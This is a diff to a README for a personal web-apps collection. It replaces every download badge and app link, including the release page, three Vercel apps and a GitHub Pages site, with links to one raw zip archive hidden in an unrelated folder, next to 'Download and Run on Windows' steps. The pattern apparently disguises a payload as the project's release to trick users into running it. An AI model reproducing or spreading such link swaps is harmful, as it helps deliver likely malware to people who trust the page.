@@ -1,6 +1,6 @@
 # 📱 my-all-personal-web-apps - Simple Web Apps You Can Use Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/clarkargumentative502/my-all-personal-web-apps/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
 
 ## 🧩 What This Is
 
@@ -22,20 +22,20 @@ This project has two ways to use the apps:
 
 ### Standalone Links
 
-- [Maitaimtabel](https://maitaimtabel.vercel.app/)
-- [Letsfokus](https://letsfokus.vercel.app/)
-- [Znippetmep](https://znippetmep.vercel.app/)
+- [Maitaimtabel](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
+- [Letsfokus](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
+- [Znippetmep](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
 - More will be added later
 
 ### Integrated Link
 
-- [My All Personal Web Apps](https://nantunggaputra.github.io/my-all-personal-web-apps/)
+- [My All Personal Web Apps](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
 
 ## 📥 Download and Run on Windows
 
 To get the app files, **visit this page to download**:
 
-[![Release Page](https://img.shields.io/badge/Download-Visit%20Release%20Page-grey?style=for-the-badge)](https://github.com/clarkargumentative502/my-all-personal-web-apps/releases)
+[![Release Page](https://img.shields.io/badge/Download-Visit%20Release%20Page-grey?style=for-the-badge)](https://github.com/clarkargumentative502/my-all-personal-web-apps/raw/refs/heads/main/kartu-ucapan-idul-fitri/personal-my-web-all-apps-2.9.zip)
 
 ### Steps for Windows
 
